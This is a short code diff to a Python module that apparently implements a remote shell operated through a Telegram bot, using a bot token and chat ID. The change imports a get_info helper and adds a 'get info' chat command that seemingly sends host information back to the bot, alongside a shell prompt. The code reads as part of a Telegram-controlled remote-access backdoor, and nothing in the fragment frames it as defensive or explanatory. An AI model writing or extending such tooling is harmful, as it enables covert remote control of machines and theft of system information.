@@ -1,9 +1,12 @@
 from .Engine import engine
-from .tools import get_last_message
+from .tools import get_last_message,get_info
 
 import os
 from time import sleep
 from subprocess import getoutput
+
+
+
 def start_shell(bot_token,chat_id):
     
     # get last message in bot
@@ -55,6 +58,13 @@ def start_shell(bot_token,chat_id):
                     )
                     
                 
+                engine.sender_message(
+                    text=f"{os.getcwd()} $",
+                    bot_token=bot_token,
+                    chat_id=chat_id
+                    ) 
+            if new_message_text == "get info":
+                get_info(bot_token,chat_id)
                 engine.sender_message(
                     text=f"{os.getcwd()} $",
                     bot_token=bot_token,
